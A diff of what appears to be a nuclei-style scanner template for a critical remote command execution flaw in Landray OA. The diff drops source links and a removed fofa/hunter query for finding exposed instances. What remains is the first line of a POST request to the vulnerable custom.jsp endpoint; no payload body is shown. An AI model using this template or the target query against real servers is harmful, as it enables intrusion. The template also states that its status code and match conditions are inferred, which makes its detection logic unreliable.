@@ -3,14 +3,8 @@ info:
   name: 蓝凌OAEKPcustom存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6263527eb0edf1eb5e52c19f0d8d6176
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 6263527eb0edf1eb5e52c19f0d8d6176
-    fofa: + hunter`app.name="Landray 蓝凌OA"`
 http:
 - raw:
   - 'POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
